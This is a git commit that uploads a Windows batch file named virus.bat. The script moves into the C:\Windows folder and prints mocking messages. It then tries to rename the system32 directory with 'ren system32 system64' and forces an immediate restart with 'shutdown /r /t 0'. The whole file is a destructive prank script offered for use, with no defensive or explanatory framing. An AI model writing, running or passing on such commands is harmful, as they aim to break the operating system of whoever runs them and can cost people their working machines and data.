22ef63439d612bdca4537686ed317b23bb022846
therizzspreader <rerererere345717@gmail.com>
2026-01-02 18:24:43 +0000

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,15 @@
+c:
+
+cd windows
+
+echo "Are you really sure?"
+
+echo "Why do you want to kill me?"
+
+ren system32 system64
+
+echo "Oh man... here i go..... "
+
+echo "You are dead to me!"
+
+shutdown /r /t 0
